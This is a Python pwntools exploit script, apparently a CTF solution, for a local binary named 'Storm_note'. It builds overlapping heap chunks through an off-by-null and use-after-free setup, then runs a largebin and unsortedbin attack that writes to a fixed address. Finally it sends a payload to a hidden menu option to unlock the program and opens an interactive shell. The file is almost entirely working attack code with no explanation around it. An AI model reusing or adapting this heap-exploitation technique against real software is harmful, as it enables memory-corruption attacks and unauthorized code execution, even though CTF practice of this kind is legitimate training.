#!/usr/bin/env python
from pwn import *
context.log_level='debug'
context.arch='amd64'

p=process('./Storm_note')

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)


def debugf(payload=''):
    gdb.attach(p,payload)

def menu(i):
    ru('Choice: ')
    sl(str(i))

def add(size):
    menu(1)
    ru('size ?\n')
    sl(str(size))

def edit(index,content):
    menu(2)
    ru('Index ?\n')
    sl(str(index))
    ru('Content: \n')
    sd(content)

def delete(index):
    menu(3)
    ru('Index ?\n')
    sl(str(index))

def debugf(payload=''):
    gdb.attach(p,payload)

add(0x10)       
add(0x38)        # 1             uaf
add(0x4f0)       

add(0x10)         # avoid consolidate

add(0x10)        
add(0x48)        # 5             uaf
add(0x4f0)       

add(0x10)         # avoid consolidate


delete(0)
edit(1,'\x00'*0x30+p64(0x60))             
delete(2)
add(0x10)          # 0
add(0x530)         # 2          largebin

delete(4)
edit(5,'\x00'*0x40+p64(0x70))
delete(6)
add(0x10)          # 4          
add(0x540)         # 6          unsortedbin

delete(2)
add(0x1000)
delete(6)
target=0xabcd0100-0x10
unsortedbin_bk=target
largebin_bk=target+0x8
largebin_bk_nextsize=target-0x20+3


edit(1,p64(0)+p64(largebin_bk)+p64(0)+p64(largebin_bk_nextsize))
edit(5,p64(0)+p64(unsortedbin_bk))
debugf('nb C41')
add(0x48)          # 6

edit(6,'\x00'*0x30)

menu('666')
ru('If you can open the lock, I will let you in\n')
sd('\x00'*0x30)


p.interactive()